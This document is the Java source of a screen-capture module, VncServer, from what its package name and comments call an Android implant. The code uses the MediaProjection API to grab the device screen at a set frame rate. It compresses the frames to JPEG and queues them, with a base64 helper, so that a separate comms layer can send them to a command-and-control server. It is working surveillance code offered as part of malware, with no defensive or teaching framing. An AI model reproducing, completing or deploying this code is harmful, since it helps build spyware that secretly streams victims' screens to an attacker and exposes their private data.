// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/vnc/VncServer.java
// ============================================================
package io.hackerai.implant.vnc;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * VncServer — screen capture and streaming engine.
 *
 * Uses MediaProjection API to capture screen frames, encodes them as
 * lightweight JPEG byte arrays, and pushes into a frame queue.
 * The comms layer reads frames from the queue and transmits to C2.
 *
 * Architecture:
 *   - MediaProjection + VirtualDisplay + ImageReader
 *   - Dedicated capture thread at configurable FPS (default 5)
 *   - Frame queue with size cap (drops oldest when full)
 *   - Configurable quality (0-100, default 30 for speed)
 *   - Cached last frame for clients that connect late
 */
public class VncServer {
    private static final String TAG = "VncServer";

    private static final int MAX_QUEUE_SIZE = 10;
    private static final int DEFAULT_WIDTH = 720;
    private static final int DEFAULT_HEIGHT = 1280;
    private static final int DEFAULT_FPS = 5;
    private static final int DEFAULT_QUALITY = 30;

    private final Context ctx;
    private final AtomicBoolean running = new AtomicBoolean(false);

    private MediaProjectionManager mpManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    private HandlerThread captureThread;
    private Handler captureHandler;

    private int screenWidth;
    private int screenHeight;
    private int screenDensity;

    private int targetWidth = DEFAULT_WIDTH;
    private int targetHeight = DEFAULT_HEIGHT;
    private int quality = DEFAULT_QUALITY;
    private int fps = DEFAULT_FPS;

    private final ConcurrentLinkedQueue<byte[]> frameQueue = new ConcurrentLinkedQueue<>();
    private byte[] lastFrame;

    // Callback interface for frame consumers
    public interface FrameListener {
        void onFrame(byte[] jpegData, int width, int height);
    }
    private volatile FrameListener frameListener;

    public VncServer(Context context) {
        this.ctx = context.getApplicationContext();
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            wm.getDefaultDisplay().getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
        } else {
            screenWidth = 1080;
            screenHeight = 1920;
            screenDensity = 320;
        }
    }

    /**
     * Start the VNC server with a MediaProjection token.
     * Must be called after MediaProjectionManager.createScreenCaptureIntent()
     * is granted by the user.
     */
    public void start(MediaProjection projection) {
        if (running.get()) {
            Log.w(TAG, "VNC already running.");
            return;
        }
        if (projection == null) {
            Log.e(TAG, "MediaProjection is null — cannot start VNC.");
            return;
        }

        this.mediaProjection = projection;
        running.set(true);

        // Start capture thread
        captureThread = new HandlerThread("vnc-capture");
        captureThread.start();
        captureHandler = new Handler(captureThread.getLooper());

        // Register projection callback
        mediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                Log.w(TAG, "MediaProjection stopped by system.");
                stop();
            }
        }, captureHandler);

        // Create ImageReader with target resolution
        imageReader = ImageReader.newInstance(
                targetWidth, targetHeight,
                PixelFormat.RGBA_8888,
                2  // max images
        );

        // Create VirtualDisplay
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "vnc-display",
                targetWidth, targetHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                captureHandler
        );

        // Start frame capture loop
        imageReader.setOnImageAvailableListener(reader -> {
            if (!running.get()) return;
            Image image = reader.acquireLatestImage();
            if (image != null) {
                byte[] jpeg = imageToJpeg(image);
                image.close();
                if (jpeg != null) {
                    enqueueFrame(jpeg);
                    lastFrame = jpeg;
                    if (frameListener != null) {
                        frameListener.onFrame(jpeg, targetWidth, targetHeight);
                    }
                }
            }
        }, captureHandler);

        // Schedule frame rate control
        captureHandler.post(new FrameCapturer());

        Log.i(TAG, "VNC started: " + targetWidth + "x" + targetHeight
                + " @" + fps + "fps quality=" + quality);
    }

    /** Internal capture loop with FPS limiting. */
    private class FrameCapturer implements Runnable {
        @Override
        public void run() {
            if (!running.get()) return;
            // ImageReader's listener already captures frames; this just
            // ensures the loop keeps running and limits FPS via postDelayed
            captureHandler.postDelayed(this, 1000 / fps);
        }
    }

    /** Convert Image (RGBA_8888) to JPEG byte array. */
    private byte[] imageToJpeg(Image image) {
        if (image.getFormat() != PixelFormat.RGBA_8888) return null;

        int width = image.getWidth();
        int height = image.getHeight();
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;

        // Create bitmap
        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);

        // Crop if padded
        Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
        if (bitmap != cropped) bitmap.recycle();

        // Compress to JPEG
        ByteArrayOutputStream baos = new ByteArrayOutputStream(65536);
        cropped.compress(Bitmap.CompressFormat.JPEG, quality, baos);
        cropped.recycle();

        return baos.toByteArray();
    }

    /** Add frame to queue, dropping oldest if full. */
    private void enqueueFrame(byte[] frame) {
        if (frameQueue.size() >= MAX_QUEUE_SIZE) {
            frameQueue.poll(); // drop oldest
        }
        frameQueue.offer(frame);
    }

    /** Get the latest frame from the queue (non-blocking). */
    public byte[] pollFrame() {
        return frameQueue.poll();
    }

    /** Get the last captured frame. */
    public byte[] getLastFrame() {
        return lastFrame;
    }

    /** Get frame as base64 string for JSON transmission. */
    public String getLastFrameBase64() {
        byte[] frame = lastFrame;
        if (frame == null) return null;
        return Base64.encodeToString(frame, Base64.NO_WRAP);
    }

    /** Stop the VNC server. */
    public void stop() {
        if (!running.compareAndSet(true, false)) return;
        Log.i(TAG, "Stopping VNC server.");

        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping VNC", e);
        }

        if (captureThread != null) {
            captureThread.quitSafely();
            captureThread = null;
        }

        frameQueue.clear();
        lastFrame = null;
    }

    public boolean isRunning() { return running.get(); }

    public void setQuality(int q) { this.quality = Math.max(5, Math.min(100, q)); }
    public void setFps(int f) { this.fps = Math.max(1, Math.min(30, f)); }
    public void setResolution(int w, int h) {
        this.targetWidth = Math.max(240, Math.min(screenWidth, w));
        this.targetHeight = Math.max(320, Math.min(screenHeight, h));
    }

    public void setFrameListener(FrameListener listener) {
        this.frameListener = listener;
    }

    /** Check if MediaProjection API is available on this device. */
    public static boolean isSupported() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP;
    }
          }
